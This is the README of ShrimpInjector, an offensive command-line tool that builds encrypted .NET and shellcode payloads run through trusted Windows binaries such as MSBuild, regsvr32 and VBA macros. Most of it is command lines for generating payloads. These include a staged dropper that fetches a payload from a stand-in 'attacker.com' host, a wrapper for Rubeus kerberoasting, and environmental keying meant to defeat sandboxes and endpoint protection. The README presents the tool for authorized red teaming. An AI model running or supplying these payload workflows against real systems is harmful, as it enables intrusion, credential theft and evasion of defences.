![](https://github.com/f8al/media/blob/dd3824a6fcd146841490ed4266f94cc1d643e438/ShrimpInjector.png?raw=true)

# ShrimpInjector

A unified, msfvenom-style command-line tool for building .NET assembly and shellcode payloads using Windows LOLBins (Living Off the Land Binaries). ShrimpInjector consolidates 16 payload generation scripts into a single tool with consistent syntax, encryption, and environmental keying across all payload types.

## Features

- **16 payload types** covering C# LOLBins, PowerShell, VBScript, HTA, VBA macros, COM scriptlets, XSL transforms, INF installers, and raw shellcode
- **AES-256-CBC** encryption with random or user-supplied keys
- **XOR encryption** with no external dependencies
- **Environmental keying** — derive the AES key from target host properties so the payload only decrypts on the intended machine
- **Assembly argument passthrough** — forward arguments to the loaded .NET assembly at runtime
- **Type/method targeting** — invoke a specific class and method instead of the assembly's entry point
- **Staged delivery** — MSBuild dropper that fetches the encrypted payload from a URL at runtime
- **Named pipe listener** — persistent MSBuild task that receives and executes assemblies over a named pipe
- **Auto-compilation** — optionally compile C# output to DLL/EXE with Mono on the attacker machine
- **Custom templates** — override any built-in template with your own

## Installation

```bash
git clone https://github.com/f8al/ShrimpInjector.git
cd ShrimpInjector
pip install -e .
```

For AES encryption support (XOR works with no dependencies):

```bash
pip install -e '.[aes]'
```

## Quick Start

```bash
# List all payload types
shrimpinjector list

# MSBuild inline task with AES (default)
shrimpinjector msbuild payload.exe -o evil.csproj

# InstallUtil with XOR encryption
shrimpinjector installutil payload.exe -e xor -o payload.cs

# PowerShell cradle with environmental keying
shrimpinjector powershell payload.exe --keying hostname=WORKSTATION1,domain=CORP

# VBA macro for Excel/Word
shrimpinjector vba payload.exe -o macro.bas

# Regsvr32 scriptlet (squiblydoo) — local or remote
shrimpinjector regsvr32 payload.exe -o payload.sct

# WMIC XSL transform
shrimpinjector wmic payload.exe -e xor -o payload.xsl

# CMSTP INF + scriptlet pair
shrimpinjector cmstp payload.exe -o payload.sct

# VBA shellcode runner from donut output
shrimpinjector shellcode payload.bin -x --no-wait -o runner.bas

# Pass arguments through to the .NET assembly
shrimpinjector msbuild Seatbelt.exe -- -group=all --full
```

## Payload Types

### C# LOLBin Payloads

These payload types embed an encrypted .NET assembly inside a C# source file designed to be executed by a trusted Windows binary. The assembly is decrypted and loaded reflectively in memory at runtime.

| Type | LOLBin | Output | Description |
|------|--------|--------|-------------|
| `msbuild` | `MSBuild.exe` | `.csproj` | Inline C# task — no compilation needed on target, runs directly from project file |
| `installutil` | `InstallUtil.exe` | `.cs` / `.dll` | Custom installer action — executes via `/U` uninstall handler |
| `workflow` | `Microsoft.Workflow.Compiler.exe` | `.cs` + `.xoml` + `.xml` + `.config` | XOML workflow compilation — multi-file output, compile-on-execute |
| `regasm` | `RegAsm.exe` | `.cs` / `.dll` | COM unregister handler — executes via `/U` flag |
| `regsvcs` | `RegSvcs.exe` | `.cs` / `.dll` | COM+ registration — requires strong-named assembly (auto-generates `.snk`) |
| `csc` | `csc.exe` | `.cs` / `.exe` | Direct compile and execute — self-contained C# source |

### Script-Based Payloads

These payload types embed an encrypted .NET assembly inside a script that bootstraps the CLR (Common Language Runtime) via COM interop, then loads and executes the assembly in memory.

| Type | Execution | Output | Description |
|------|-----------|--------|-------------|
| `powershell` | `powershell.exe` | `.ps1` | In-memory assembly load via `[System.Reflection.Assembly]` |
| `vbscript` | `cscript.exe` | `.vbs` | CLR bootstrap via `MSCorLib` COM object |
| `hta` | `mshta.exe` | `.hta` | HTML Application — same CLR bootstrap as VBScript, browser context |
| `vba` | Excel / Word | `.bas` | VBA macro with base64 chunking (800-char lines) for VBA editor limits |

### Scriptlet / XSL / INF Payloads

These payload types use the same CLR bootstrap as VBScript but wrap it in alternate delivery formats — COM scriptlets, XSL transforms, and INF installer files — allowing execution through additional trusted Windows binaries.

| Type | LOLBin | Output | Description |
|------|--------|--------|-------------|
| `regsvr32` | `regsvr32.exe` | `.sct` | COM scriptlet via `scrobj.dll` — the "squiblydoo" technique, supports remote URL execution |
| `wmic` | `wmic.exe` | `.xsl` | XSL stylesheet with embedded VBScript — supports remote HTTP/SMB, less monitored than direct script execution |
| `cmstp` | `cmstp.exe` | `.inf` + `.sct` | Connection Manager profile installer — INF triggers scriptlet load, UAC bypass potential |
| `rundll32` | `rundll32.exe` | `.sct` | JavaScript `GetObject()` loads a COM scriptlet — fileless when combined with remote URL |
| `infdefaultinstall` | `InfDefaultInstall.exe` | `.inf` + `.sct` | Lesser-known INF handler — same scriptlet mechanism as CMSTP, fewer detections |

### Shellcode Payload

| Type | Execution | Output | Description |
|------|-----------|--------|-------------|
| `shellcode` | Excel / Word | `.bas` | VBA shellcode runner — injects raw shellcode via `VirtualAlloc`/`CreateThread`, no CLR needed. Designed for use with donut or similar shellcode generators. |

## Encryption

### AES-256-CBC (Default)

All payload types (except shellcode) default to AES-256-CBC encryption. A random 32-byte key and 16-byte IV are generated unless you supply your own:

```bash
# Random key + IV (printed to stderr)
shrimpinjector msbuild payload.exe

# Custom key and IV
shrimpinjector msbuild payload.exe --key <64-hex-chars> --iv <32-hex-chars>
```

### XOR

A simpler encryption option with no dependency on the `cryptography` package:

```bash
shrimpinjector installutil payload.exe -e xor
shrimpinjector installutil payload.exe -e xor --key <hex>
```

For the shellcode type, XOR is toggled separately since it doesn't use the standard encryption pipeline:

```bash
shrimpinjector shellcode payload.bin -x
shrimpinjector shellcode payload.bin -x --xor-key <hex>
```

### Environmental Keying

Derive the AES key from properties of the target host. The payload will only decrypt successfully on a machine that matches the specified values. This prevents the payload from being analyzed on a sandbox or different workstation.

Supported properties: `hostname`, `domain`, `user`, `machineguid`

```bash
# Single property
shrimpinjector powershell payload.exe --keying hostname=DC01

# Multiple properties (all must match)
shrimpinjector msbuild payload.exe --keying hostname=WS01,domain=CORP,user=jsmith

# Environmental keying requires AES (default) — cannot combine with -e xor
```

The keying values are combined with a random salt and hashed (SHA-256) to produce the AES key. The salt and keying property names are embedded in the payload; the values are not, so static analysis of the payload does not reveal the target.

## MSBuild Special Modes

MSBuild supports two additional delivery modes beyond the standard inline payload.

### Staged Delivery

Generates a lightweight dropper (`.csproj`) and a separate encrypted payload (`.bin`). The dropper fetches the payload from the specified URL at runtime:

```bash
shrimpinjector msbuild payload.exe --staged https://attacker.com/payload.bin
```

This produces:
- `msbuild_ready.csproj` — the dropper (small, no embedded payload)
- `msbuild_ready.bin` — the encrypted payload to host on your server

### Named Pipe Listener

Generates an MSBuild task that listens on a named pipe for AES-encrypted assemblies. This creates a persistent execution primitive — send different tools through the same pipe without touching disk:

```bash
shrimpinjector msbuild --listener pipe=myloader
```

The tool prints the AES key, IV, and a sample command for sending assemblies through the pipe.

## Assembly Arguments

Pass arguments to the loaded .NET assembly using the `--` separator. Everything after `--` is forwarded to the assembly's entry point:

```bash
# Seatbelt with group and full output
shrimpinjector msbuild Seatbelt.exe -- -group=all --full

# Rubeus with kerberoast action
shrimpinjector installutil Rubeus.exe -- kerberoast /outfile:hashes.txt
```

## Type and Method Targeting

By default, payloads invoke the assembly's `Main` entry point. Use `--type` and `--method` to target a specific class and method:

```bash
shrimpinjector msbuild payload.dll --type MyNamespace.MyClass --method Execute
```

Both `--type` and `--method` must be specified together.

## Compilation

C# payload types (`installutil`, `regasm`, `regsvcs`, `csc`) support auto-compilation with Mono's `mcs` compiler:

```bash
# Generate source only (default)
shrimpinjector installutil payload.exe -o payload.cs

# Compile to DLL
shrimpinjector installutil payload.exe --compile

# RegSvcs — auto-generates .snk keypair for strong naming
shrimpinjector regsvcs payload.exe --compile

# RegSvcs with existing keypair
shrimpinjector regsvcs payload.exe --compile --keyfile existing.snk
```

Requires [Mono](https://www.mono-project.com/) (`brew install mono` on macOS).

## Workflow Compiler

The `workflow` type is unique in that it produces 4 output files that must all be present on the target:

```bash
shrimpinjector workflow payload.exe -o outdir/
```

Produces:
- `workflow_ready.cs` — C# payload source
- `workflow_ready.xoml` — XOML workflow definition
- `workflow_input_ready.xml` — input file referencing the above
- `Microsoft.Workflow.Compiler.exe.config` — runtime config

On target:
```
copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe .
.\Microsoft.Workflow.Compiler.exe workflow_input_ready.xml out.log
```

## Custom Templates

Override any built-in template with your own using the `--template` flag:

```bash
shrimpinjector msbuild payload.exe --template ./my_custom_msbuild.csproj
```

Built-in templates are in `shrimpinjector/templates/`. Custom templates should use the same placeholder markers (`YOURPAYLOADHERE`, `YOURKEYHERE`, etc.) as the originals.

## Shellcode Runner

The `shellcode` type is fundamentally different from the other payload types. It takes raw shellcode (not a .NET assembly) and produces a VBA macro that allocates memory, writes the shellcode, and executes it via `CreateThread`.

```bash
# Basic shellcode injection
shrimpinjector shellcode payload.bin

# With XOR encryption
shrimpinjector shellcode payload.bin -x

# For donut payloads using exit thread (-x 3), use --no-wait
# to skip WaitForSingleObject (prevents Excel from hanging)
shrimpinjector shellcode payload.bin -x --no-wait
```

## Full Usage Reference

```
shrimpinjector <type> <input> [options] [-- assembly_args...]

Payload types:
  msbuild            MSBuild inline task (.csproj)
  installutil        InstallUtil custom action (.cs)
  workflow           Workflow Compiler (.cs + .xoml + .xml)
  regasm             RegAsm unregister handler (.cs)
  regsvcs            RegSvcs COM+ registration (.cs)
  csc                csc.exe compile and run (.cs)
  powershell         PowerShell cradle (.ps1)
  vbscript           VBScript CLR bootstrap (.vbs)
  hta                HTA application (.hta)
  vba                VBA macro (.bas)
  shellcode          VBA shellcode runner (.bas)
  regsvr32           Regsvr32 scriptlet (.sct)
  wmic               WMIC XSL transform (.xsl)
  cmstp              CMSTP profile installer (.inf + .sct)
  rundll32           Rundll32 scriptlet (.sct)
  infdefaultinstall  InfDefaultInstall (.inf + .sct)

Common options:
  -e, --encryption {aes,xor}   Encryption mode (default: aes)
  --key HEX                     Encryption key as hex string
  --iv HEX                      AES IV as hex (16 bytes)
  -o, --output PATH             Output file path
  --template PATH               Custom template file
  --keying SPEC                 Environmental keying (hostname=X,domain=Y,...)
  --type CLASS                  Target type (fully qualified)
  --method NAME                 Target method name
  --compile                     Auto-compile with Mono mcs
  --staged URL                  MSBuild staged delivery URL
  --listener pipe=NAME          MSBuild named pipe listener
  --keyfile PATH                RegSvcs .snk keypair file
  -x, --xor                    Shellcode XOR encryption
  --xor-key HEX                Shellcode XOR key
  --no-wait                     Shellcode: skip WaitForSingleObject

  -V, --version                 Show version
  list                          List available payload types
```

## Use Cases

ShrimpInjector is designed for authorized red team operations and penetration testing engagements where you need to:

- **Bypass application control** — Execute payloads through trusted, signed Windows binaries that are commonly allowed by application whitelisting and app-blocking solutions
- **Evade endpoint protection** — Encrypted payloads with environmental keying prevent static analysis and sandbox detonation by EDR and AV products
- **Operate without dropping executables** — LOLBin execution, in-memory assembly loading, and fileless script payloads avoid triggering file-based detection
- **Deliver post-exploitation tooling** — Wrap C# offensive tools (Seatbelt, Rubeus, SharpHound, etc.) for execution through controlled delivery channels
- **Test detection coverage** — Validate whether security monitoring detects LOLBin abuse, in-memory .NET loading, and encrypted payload delivery

## Disclaimer

This tool is intended for authorized security testing and research only. Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for misuse.

## Author

**f8al** — [https://github.com/f8al](https://github.com/f8al)
